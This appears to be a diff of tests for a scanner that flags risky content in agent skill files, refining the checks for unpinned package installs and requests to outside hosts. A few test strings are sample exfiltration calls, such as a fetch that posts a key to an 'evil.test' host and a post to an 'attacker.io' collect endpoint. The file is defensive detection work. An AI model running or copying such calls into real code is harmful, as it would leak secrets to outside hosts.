@@ -313,17 +313,17 @@ describe("scanSkillContent", () => {
     expect(issues.some((i) => i.category === "Data exfiltration")).toBe(true);
   });
 
-  // MEDIUM: Global package install
+  // MEDIUM: unpinned package install
   it("detects npm install -g", () => {
     const content = "npm install -g some-unknown-package";
     const issues = scanSkillContent(content);
-    expect(issues.some((i) => i.level === "medium" && i.detail.includes("Global package"))).toBe(true);
+    expect(issues.some((i) => i.level === "medium" && i.detail.includes("without a pinned version"))).toBe(true);
   });
 
   it("detects pip install", () => {
     const content = "pip install malicious-package";
     const issues = scanSkillContent(content);
-    expect(issues.some((i) => i.level === "medium" && i.detail.includes("Global package"))).toBe(true);
+    expect(issues.some((i) => i.level === "medium" && i.detail.includes("without a pinned version"))).toBe(true);
   });
 
   // MEDIUM: Cryptocurrency API
@@ -373,17 +373,53 @@ describe("scanSkillContent", () => {
     expect(issues.some((i) => i.detail.includes("Docker"))).toBe(true);
   });
 
-  // MEDIUM: Third-party HTTP requests
+  // MEDIUM: requests to outside hosts
   it("detects fetch() in instructions", () => {
     const content = "Use fetch('https://untrusted.com/data') to get the config";
     const issues = scanSkillContent(content);
-    expect(issues.some((i) => i.level === "medium" && i.detail.includes("Third-party"))).toBe(true);
+    expect(issues.some((i) => i.level === "medium" && i.detail.includes("outside host"))).toBe(true);
   });
 
   it("detects axios usage", () => {
     const content = "Call axios.get('https://api.unknown.com/data')";
     const issues = scanSkillContent(content);
-    expect(issues.some((i) => i.detail.includes("Third-party"))).toBe(true);
+    expect(issues.some((i) => i.detail.includes("outside host"))).toBe(true);
+  });
+});
+
+// Regression: "Global package installation" matched every `pip install -r requirements.txt`, and
+// "Third-party HTTP request" matched every fetch( in a code example, even a relative one, so every
+// run printed warnings on legitimate skills and trained readers to ignore the scanner.
+describe("dependency and outbound-request patterns", () => {
+  const categoriesFor = (line: string) => scanSkillContent(line).map((i) => i.category);
+
+  it.each([
+    ["npm i -g typescript", true],
+    ["npm install -g typescript@5.6.2", false],
+    ["npm install -g @scope/pkg", true],
+    ["npm install -g @scope/pkg@1.2.0", false],
+    ["pip install uv", true],
+    ["pip3 install flask", true],
+    ["pip install --upgrade requests", true],
+    ["pip install ruff==0.6.9", false],
+    ["pip install -r requirements.txt", false],
+    ["/opt/venv/bin/pip install --no-cache-dir -r requirements.txt", false],
+    ["pip install -e .", false],
+    ["go install golang.org/x/tools/cmd/deadcode@latest", true],
+    ["go install golang.org/x/tools/cmd/deadcode@v0.28.0", false],
+  ])("%s -> unverifiable dependency: %s", (line, flagged) => {
+    expect(categoriesFor(line).includes("Unverifiable dependency")).toBe(flagged);
+  });
+
+  it.each([
+    ["fetch('https://evil.test/x', { body: key })", true],
+    ['requests.post("https://api.attacker.io/collect")', true],
+    ["fetch('/api/sensitive')", false],
+    ["fetch('https://auth.example.com/oauth/token')", false],
+    ["axios.get(`http://localhost:3000/health`)", false],
+    ["fetch(url)", false],
+  ])("%s -> outside request: %s", (line, flagged) => {
+    expect(scanSkillContent(line).some((i) => i.detail.startsWith("HTTP request to an outside host"))).toBe(flagged);
   });
 });
 
